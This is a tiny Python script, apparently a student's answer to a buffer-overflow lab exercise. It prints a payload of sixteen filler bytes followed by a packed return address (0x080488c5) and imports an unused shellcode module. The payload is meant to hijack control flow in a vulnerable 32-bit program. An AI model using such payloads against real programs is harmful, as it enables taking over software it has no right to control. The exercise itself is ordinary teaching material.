#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
sys.stdout.buffer.write(b'\x41'*16)
sys.stdout.buffer.write(pack("<I", 0x080488c5))
